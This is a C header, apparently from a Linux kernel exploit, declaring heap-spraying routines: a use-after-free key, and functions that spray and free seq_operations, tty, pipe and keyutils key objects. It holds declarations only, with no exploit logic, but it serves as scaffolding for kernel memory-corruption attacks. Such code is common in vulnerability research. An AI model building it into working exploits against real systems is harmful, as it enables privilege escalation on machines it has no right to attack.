#ifndef HEAP_SPRAY_H
#define HEAP_SPRAY_H

#include <keyutils.h>

#include "../config.h"

extern key_serial_t uaf_key;
extern key_serial_t keys[MAX_KEYS * N_KEY_THREADS];
extern pthread_barrier_t key_barrier;

extern int spray_seq_ops(void);
extern int free_seq_ops(void);
extern int alloc_seq_ops(int* fds, int n_fds);

extern int spray_tty(int num);
extern int free_ttys(int num);

extern int alloc_pipes(int num, int (*pipefds)[2], int* n_pipefds,
    int max);
extern int free_pipes(int num, int (*pipefds)[2], int* n_pipefds);

extern long free_key(key_serial_t id);
extern int free_keys(int num, int skip_uaf);
extern int spray_keys(u_int32_t nkeys,
    void* xattr_value,
    size_t xattr_value_sz,
    void* key_payload,
    size_t key_payload_sz,
    int barrier);

#endif
